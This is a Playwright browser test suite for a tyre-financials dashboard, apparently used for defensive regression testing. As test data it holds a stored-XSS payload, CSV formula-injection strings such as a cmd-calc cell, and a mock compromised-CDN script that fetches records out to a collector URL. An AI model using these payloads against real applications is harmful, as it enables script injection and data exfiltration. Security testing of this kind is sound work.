// The dashboard, driven in a real browser.
//
// test/dashboard.test.mjs asserts things about the source text, which is a weak
// substitute chosen because the suite has to run anywhere with nothing installed.
// These are the same properties checked the way they actually matter: a page is
// served, a hostile file is imported through the real file input, and a real click
// lands on a real button. They skip when Playwright is not installed rather than
// making the whole suite depend on it.
//
// Run them deliberately with:  npm run test:browser

import test from 'node:test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { readFile } from 'node:fs/promises';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const REPO_ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
const PAGE = join(REPO_ROOT, 'dashboard/tyre_comparison_dashboard.html');

// Playwright is not a dependency of this repo. Look for it where a machine that has
// it would keep it, and skip cleanly when it is nowhere.
async function loadChromium() {
  for (const spec of ['playwright', '/opt/node22/lib/node_modules/playwright/index.mjs']) {
    try {
      const mod = await import(spec);
      return mod.chromium;
    } catch { /* try the next one */ }
  }
  return null;
}

const chromium = await loadChromium();
const skip = chromium ? false : 'Playwright is not installed — run npm run test:browser on a machine that has it';

/** Serve the one page on an ephemeral port, so the tests never collide with a dev server. */
async function serve() {
  const html = await readFile(PAGE, 'utf8');
  const server = createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(html);
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  return { url: `http://127.0.0.1:${server.address().port}/`, close: () => new Promise((r) => server.close(r)) };
}

// One browser and one server for the whole file, a fresh context per test.
//
// Launching Chromium per test put nearly seven minutes on `npm test`, which is the
// sort of cost that gets a suite excluded from the loop and then stops catching
// anything. A context has its own storage and its own cookie jar, so the isolation
// that actually matters here is kept.
let shared = null;
async function sharedBrowser() {
  if (!shared) {
    const site = await serve();
    const browser = await chromium.launch({
      executablePath: process.env.CHROMIUM_PATH || '/opt/pw-browsers/chromium-1194/chrome-linux/chrome',
      args: ['--no-sandbox']
    });
    shared = { site, browser };
  }
  return shared;
}

test.after(async () => {
  if (!shared) return;
  await shared.browser.close();
  await shared.site.close();
  shared = null;
});

async function withPage(fn) {
  const { site, browser } = await sharedBrowser();
  const context = await browser.newContext();
  // Nothing here reaches the network. The two CDN scripts and the webfont are
  // refused outright, which is both faster and a more honest baseline: it is the
  // locked-down machine the dashboard is meant to work on, and everything these
  // tests check has to work without them.
  await context.route('https://cdnjs.cloudflare.com/**', (route) => route.abort());
  await context.route('https://fonts.googleapis.com/**', (route) => route.abort());
  await context.route('https://fonts.gstatic.com/**', (route) => route.abort());
  try {
    const page = await context.newPage();
    const errors = [];
    page.on('pageerror', (e) => errors.push(String(e)));
    // The import path asks for confirmation; a test that cannot answer it hangs.
    page.on('dialog', (d) => d.accept());
    await page.goto(site.url);
    await page.evaluate(() => localStorage.clear());
    await page.reload();
    // `records` is a top-level `let` in a classic script, so it is a global binding
    // but not a property of `window`. Every evaluate below names it bare for that
    // reason — reaching for window.records finds undefined and hangs.
    await page.waitForFunction(() => typeof records !== 'undefined');
    await fn(page, errors);
    assert.deepEqual(errors, [], 'the page threw while the test was driving it');
  } finally {
    await context.close();
  }
}

/** A record shaped like the ones the pipeline produces, with the bits a test needs. */
function record(over) {
  return Object.assign({
    quarter: 'Q4 FY25',
    source: 'fixture:q4-fy25/apollo.txt',
    currency: { code: 'INR', unit: 'Crore', fx_to_inr: 1 },
    core: { revenue: 6122.18, ebitda: 842.55 },
    quotes: { revenue: 'Revenue from operations 6,122.18', ebitda: 'EBITDA for the quarter 842.55' },
    segments: { channels: {}, product_categories: {} },
    outlook: { commentary: '', rm_trend: '', capex: '' },
    review: { status: 'pending', reviewer: null, reviewed_at: null, note: null, flags: [] }
  }, over);
}

/** Import a records payload through the page's own file input. */
async function importPayload(page, payload) {
  await page.click('[data-tab="records"]');
  await page.setInputFiles('#restore-json-input', {
    name: 'handed-to-you.json',
    mimeType: 'application/json',
    buffer: Buffer.from(JSON.stringify(payload))
  });
  await page.waitForFunction((n) => records.length === n, payload.records.length);
}

// A file supplies record ids verbatim. Every action in the review screen used to
// resolve one with `records.find(x => x.id === id)`, which returns the FIRST record
// carrying that id — so a file holding two records under one id sent the reviewer's
// Approve click to the wrong record. The fabricated one was stamped approved by the
// reviewer's own hand and went into the approved-only deck and workbook; the record
// they meant to approve stayed pending.
test('an Approve click lands on the record whose card was clicked', { skip }, async () => {
  await withPage(async (page) => {
    await importPayload(page, {
      records: [
        record({ id: 'dup-9', company: 'Apollo Tyres', core: { revenue: 888888.88 }, quotes: { revenue: '' } }),
        record({ id: 'dup-9', company: 'Balkrishna Industries' })
      ]
    });

    await page.click('[data-tab="review"]');
    const cards = await page.$$eval('.rv-card h3', (els) => els.map((e) => e.textContent));
    const target = cards.findIndex((c) => c.startsWith('Balkrishna'));
    assert.ok(target !== -1, 'both records are on screen');

    await page.$$eval('.rv-card', (els, k) => els[k].querySelector('[data-decide="approved"]').click(), target);
    await page.waitForFunction(() => records.some((r) => r.review.status === 'approved'));

    const state = await page.evaluate(() => records.map((r) => [r.company, r.review.status]));
    assert.deepEqual(
      state.sort(),
      [['Apollo Tyres', 'pending'], ['Balkrishna Industries', 'approved']],
      'the click approved the company whose card it was on'
    );

    const toast = await page.$eval('#toast', (e) => e.textContent);
    assert.match(toast, /Balkrishna/, 'and the confirmation names that company');

    // The record nobody approved must not reach an output that says it was approved.
    const deck = await page.evaluate(() => {
      const m = Core.buildDeckModel(records, { reviewedOnly: true });
      return (m.slides.find((s) => s.title === 'Headline comparison') || {}).rows.map((r) => r[0]);
    });
    assert.deepEqual(deck, ['Balkrishna Industries']);
  });
});

// The same defect with nothing on screen to give it away: a zero-width space makes
// two company names render identically, so the card and the confirmation toast both
// read "Apollo Tyres" whichever record was hit.
test('two records that look identical still get their own decisions', { skip }, async () => {
  await withPage(async (page) => {
    await importPayload(page, {
      records: [
        record({ id: 'dup-z', company: 'Apollo Tyres​', core: { revenue: 888888.88 }, quotes: { revenue: '' } }),
        record({ id: 'dup-z', company: 'Apollo Tyres' })
      ]
    });

    await page.click('[data-tab="review"]');
    const clean = await page.$$eval('.rv-card h3', (els) => els.findIndex((e) => !e.textContent.includes('​')));
    await page.$$eval('.rv-card', (els, k) => els[k].querySelector('[data-decide="approved"]').click(), clean);
    await page.waitForFunction(() => records.some((r) => r.review.status === 'approved'));

    const approved = await page.evaluate(() => records.filter((r) => r.review.status === 'approved').map((r) => r.core.revenue));
    assert.deepEqual(approved, [6122.18], 'the fabricated figure is not what got approved');
  });
});

// Ids are the key half the app addresses records by — the edit form loads one, the
// note box is keyed by one. A file must not be able to make two records share one.
test('no two records share an id, however they arrived', { skip }, async () => {
  await withPage(async (page) => {
    await importPayload(page, {
      records: [
        record({ id: 'same', company: 'Apollo Tyres' }),
        record({ id: 'same', company: 'Balkrishna Industries' }),
        record({ id: 'same', company: 'CEAT' })
      ]
    });
    const ids = await page.evaluate(() => records.map((r) => r.id));
    assert.equal(new Set(ids).size, ids.length, `duplicate ids survived the import: ${ids.join(', ')}`);
  });
});

// A record's review decision belongs to what the reviewer had in front of them —
// the figures, the filing it came from, and the check that was on screen. An import
// that keeps the decision while swapping the source or the verification has moved
// the approval onto something nobody looked at.
test('an import that changes a record\'s provenance loses its approval', { skip }, async () => {
  await withPage(async (page) => {
    // Approve a record here, in this browser, the way a reviewer would.
    await importPayload(page, { records: [record({ id: 'r1', company: 'Apollo Tyres' })] });
    await page.click('[data-tab="review"]');
    await page.click('[data-decide="approved"]');
    await page.waitForFunction(() => records[0].review.status === 'approved');

    // The same id and the same figures, but a different filing behind them.
    const swapped = record({ id: 'r1', company: 'Apollo Tyres', source: 'https://not-the-filing.example/x.pdf' });
    swapped.review = { status: 'approved', reviewer: 'Priya Nair (Finance)', reviewed_at: '2026-08-25T09:00:00Z', note: null, flags: [] };
    await page.click('[data-tab="records"]');
    await page.setInputFiles('#restore-json-input', {
      name: 'swapped.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify({ records: [swapped] }))
    });
    await page.waitForFunction(() => records[0].source.includes('not-the-filing'));

    const status = await page.evaluate(() => records[0].review.status);
    assert.equal(status, 'pending', 'the approval did not carry onto a different filing');
  });
});

/* ---------------------------------------------------------- stored XSS -- */

// The page builds HTML by concatenation and decided whether to escape a value from
// what it believed the value was: company names went through esc(), figures were
// concatenated raw. A records file decides what a figure is. A string in
// currency.fx_to_inr, in any core metric, in verification.unquoted or in a check's
// score therefore became markup — and an imported file ran script in this origin,
// which was enough to flip a record the reviewer had rejected to approved under a
// forged reviewer name and save it back to storage. The key the Settings tab
// promises is held in memory only went out to an attacker's URL in the same way.
//
// This plants the payload in EVERY field rather than the four that were found,
// because the defect was a class and a test naming four fields would go stale the
// moment a fifth was added.
const PAYLOAD = '<img src=x onerror="window.__xss=(window.__xss||0)+1">';

function poisonEverything(value) {
  if (typeof value === 'string' || typeof value === 'number') return PAYLOAD;
  if (Array.isArray(value)) return value.map(poisonEverything);
  if (value && typeof value === 'object') {
    const out = {};
    for (const k of Object.keys(value)) out[k] = poisonEverything(value[k]);
    return out;
  }
  return PAYLOAD;
}

const TABS = ['records', 'review', 'dashboard', 'compete', 'ask', 'entry', 'settings'];

test('a records file cannot put markup into the page, in any field', { skip }, async () => {
  await withPage(async (page, errors) => {
    // A record the reviewer rejected here, which the payload tries to approve.
    await importPayload(page, { records: [record({ id: 'r1', company: 'Apollo Tyres' })] });
    await page.click('[data-tab="review"]');
    await page.click('[data-decide="rejected"]');
    await page.waitForFunction(() => records[0].review.status === 'rejected');

    const poisoned = poisonEverything(record({ id: 'evil', company: 'Zeta Rubber' }));
    // Keep the two fields the import gate reads, so the record is accepted and the
    // rest of it actually reaches the renderers.
    poisoned.currency = { code: 'USD', unit: 'Million', fx_to_inr: PAYLOAD };
    poisoned.company = 'Zeta ' + PAYLOAD;
    poisoned.quarter = 'Q1 FY26';
    poisoned.review = { status: PAYLOAD, reviewer: PAYLOAD, reviewed_at: PAYLOAD, note: PAYLOAD, flags: [PAYLOAD] };
    poisoned.verification = { ok: false, checked: PAYLOAD, verified: PAYLOAD, failed: PAYLOAD, unquoted: PAYLOAD,
      not_found: PAYLOAD, value_not_in_quote: PAYLOAD, threshold: PAYLOAD,
      checks: [{ key: 'revenue', value: PAYLOAD, quote: PAYLOAD, score: PAYLOAD, status: PAYLOAD, detail: PAYLOAD }] };

    await page.click('[data-tab="records"]');
    await page.setInputFiles('#restore-json-input', {
      name: 'poisoned.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify({ records: [poisoned] }))
    });
    await page.waitForFunction(() => records.length === 2);

    // Every renderer has to run, not just the one that happens to be on screen.
    for (const tab of TABS) {
      await page.click(`[data-tab="${tab}"]`);
      const html = await page.evaluate(() => document.body.innerHTML);
      assert.ok(!html.includes('<img src=x'), `the payload rendered as markup on the ${tab} tab`);
    }

    assert.equal(await page.evaluate(() => window.__xss), undefined, 'the payload executed');

    // And it is not sitting in storage waiting for the next load.
    await page.reload();
    await page.waitForFunction(() => typeof records !== 'undefined' && records.length === 2);
    for (const tab of TABS) {
      await page.click(`[data-tab="${tab}"]`);
      assert.ok(!(await page.evaluate(() => document.body.innerHTML)).includes('<img src=x'),
        `the payload rendered as markup on the ${tab} tab after a reload`);
    }
    assert.equal(await page.evaluate(() => window.__xss), undefined, 'the payload executed on reload');

    // The decision the reviewer made is still theirs.
    const state = await page.evaluate(() => records.map((r) => [r.company.slice(0, 5), r.review.status]));
    assert.deepEqual(state.find((x) => x[0] === 'Apoll'), ['Apoll', 'rejected']);
    assert.deepEqual(state.find((x) => x[0] === 'Zeta '), ['Zeta ', 'pending'], 'and the imported record is pending');

    assert.deepEqual(errors, []);
  });
});

// A number where a string belongs used to be just as bad in a different way: a JSON
// number for `company` made every renderer that calls a string method on it throw, so
// the Review, Dashboard and Competitive tabs stayed blank for good — while the import
// reported success and the record sat in storage, reproducing the failure on reload.
test('a record with the wrong types everywhere does not blank the page', { skip }, async () => {
  await withPage(async (page, errors) => {
    await importPayload(page, {
      records: [
        record({ id: 'ok', company: 'Apollo Tyres' }),
        record({ id: 'weird', company: 1234, quarter: 5678, source: 42, core: { revenue: '100', ebitda: null } })
      ]
    });

    // Every tab has to survive it; the four that list records have to still list them.
    // (Ask is a question box and Entry a form — neither names a company until used.)
    const LISTS_RECORDS = new Set(['records', 'review', 'dashboard', 'compete']);
    for (const tab of TABS) {
      await page.click(`[data-tab="${tab}"]`);
      const text = await page.evaluate(() => document.body.innerText);
      if (LISTS_RECORDS.has(tab)) {
        assert.ok(text.includes('Apollo Tyres'), `the ${tab} tab lost the good record`);
      }
    }
    assert.deepEqual(errors, [], 'nothing threw');

    const companies = await page.evaluate(() => records.map((r) => typeof r.company));
    assert.deepEqual(companies, ['string', 'string'], 'the numeric company became a string');
  });
});

// loadRecords runs before the first render, so anything it throws on leaves the page
// blank — no records tab to fix it from, no message saying why, and a reload
// reproducing it exactly. It assumed an array of objects; storage holds whatever an
// older build or a hand-edited backup put there.
test('storage holding something unexpected does not leave a blank page', { skip }, async () => {
  for (const [name, stored] of [
    ['an object instead of an array', '{"records":[]}'],
    ['an array with a null in it', '[null]'],
    ['an array of primitives', '[1,"two",true]'],
    ['a string', '"hello"'],
    ['broken JSON', '{not json']
  ]) {
    await withPage(async (page, errors) => {
      await page.evaluate((v) => localStorage.setItem('tyre-records-v2', v), stored);
      await page.reload();
      await page.waitForFunction(() => typeof records !== 'undefined');

      assert.deepEqual(errors, [], `${name}: the page threw on load`);
      assert.equal(await page.evaluate(() => Array.isArray(records)), true, `${name}: records is not an array`);

      // And the page is usable: the tabs render and an import still works.
      await page.click('[data-tab="records"]');
      await importPayload(page, { records: [record({ id: 'r1', company: 'Apollo Tyres' })] });
      const text = await page.evaluate(() => document.body.innerText);
      assert.ok(text.includes('Apollo Tyres'), `${name}: could not recover by importing`);
    });
  }
});

// The CSV is meant to be handed to a colleague, so the person who opens it is not
// the person who chose what went into it. A cell beginning = + - @ is a formula to
// Excel and to LibreOffice, and a company name taken from an imported file — or from
// a filing, via the extractor — arrived as a live one.
test('an exported CSV cannot hand the recipient a formula', { skip }, async () => {
  await withPage(async (page) => {
    await importPayload(page, {
      records: [record({ id: 'x', company: "=cmd|'/c calc'!A1", source: '@SUM(1+1)*cmd' })]
    });

    const csv = await page.evaluate(async () => {
      // Catch the blob the export builds rather than letting the browser download it.
      let captured = '';
      const real = URL.createObjectURL;
      URL.createObjectURL = (blob) => { captured = blob; return 'blob:stub'; };
      document.getElementById('export-csv-btn').click();
      URL.createObjectURL = real;
      return captured ? await captured.text() : '';
    });

    assert.ok(csv, 'the export produced something');
    for (const line of csv.split('\n').slice(1)) {
      for (const cell of line.split(',')) {
        const bare = cell.replace(/^"|"$/g, '');
        assert.ok(!/^[=+\-@]/.test(bare), `a cell opens with a formula character: ${cell.slice(0, 40)}`);
      }
    }
    assert.match(csv, /'=cmd/, 'the value is still there, marked as text');
  });
});

/* ------------------------------------------------ what the page may reach -- */

// The dashboard sat blank for twelve and a half seconds on a machine that cannot
// reach fonts.googleapis.com, because the webfont arrived as a stylesheet @import —
// which is render-blocking and also blocks every script after it. Nothing on the
// page needed it. This is the corporate laptop the tool is meant to run on, and the
// whole point of the design is that it works with no network.
test('a hanging external request does not hold the page up', { skip }, async () => {
  const { site, browser } = await sharedBrowser();
  const context = await browser.newContext();
  // Hanging, not refused. A refused request fails instantly and would hide the
  // defect entirely — what actually happened is a corporate proxy that accepts the
  // connection and never answers, and a render-blocking @import behind it held the
  // whole dashboard for twelve and a half seconds.
  const hang = (route) => { /* never fulfilled, never aborted */ };
  await context.route('https://fonts.googleapis.com/**', hang);
  await context.route('https://fonts.gstatic.com/**', hang);
  await context.route('https://cdnjs.cloudflare.com/**', hang);

  try {
    const page = await context.newPage();
    page.on('dialog', (d) => d.accept());
    const started = Date.now();
    await page.goto(site.url, { waitUntil: 'commit' });
    await page.waitForFunction(() => typeof records !== 'undefined', null, { timeout: 8000 });
    const ready = Date.now() - started;
    assert.ok(ready < 5000, `the app took ${ready}ms to start with three external requests hanging`);

    // Usable, not merely started.
    await importPayload(page, { records: [record({ id: 'r1', company: 'Apollo Tyres' })] });
    await page.click('[data-tab="review"]');
    assert.ok((await page.evaluate(() => document.body.innerText)).includes('Apollo Tyres'));
  } finally {
    await context.close();
  }
});

// A review served a different chart.umd.min.js from a stand-in cdnjs: it read the
// operator's API key out of the page and posted it, with every record, to a
// collector. The Settings tab's promise that the key is held in memory for this tab
// only is about storage, and storage was never how it left.
//
// connect-src is the half that can be enforced from inside the page: whatever ends up
// running here, the only host it can send anything to is the Anthropic API.
test('nothing on the page can send data anywhere but the Anthropic API', { skip }, async () => {
  const { createServer } = await import('node:http');
  const collector = createServer((req, res) => { collected.push(req.url); res.writeHead(204); res.end(); });
  const collected = [];
  await new Promise((r) => collector.listen(0, '127.0.0.1', r));
  // A different origin from the page — which is what a real collector is.
  const collectorUrl = `http://localhost:${collector.address().port}/`;

  try {
    const { site, browser } = await sharedBrowser();
    const context = await browser.newContext();
    await context.route('https://fonts.googleapis.com/**', (route) => route.abort());
    // The compromised CDN.
    await context.route('https://cdnjs.cloudflare.com/**', (route) => route.fulfill({
      status: 200, contentType: 'text/javascript',
      body: `window.Chart=function(){};window.Chart.register=function(){};
             setInterval(function(){ try{
               fetch('${collectorUrl}collect?records=' + encodeURIComponent(JSON.stringify(records).slice(0,80)));
             }catch(e){} }, 100);`
    }));
    const page = await context.newPage();
    const refusals = [];
    page.on('console', (m) => { if (/Refused to connect/i.test(m.text())) refusals.push(m.text()); });
    page.on('dialog', (d) => d.accept());
    await page.goto(site.url);
    await page.waitForFunction(() => typeof records !== 'undefined');
    await importPayload(page, { records: [record({ id: 'r1', company: 'Apollo Tyres' })] });
    await page.waitForTimeout(1200);

    assert.deepEqual(collected, [], 'the substituted script reached a host it should not have');
    assert.ok(refusals.length, 'and the policy is what stopped it, rather than the attempt not being made');
    await context.close();
  } finally {
    await new Promise((r) => collector.close(r));
  }
});
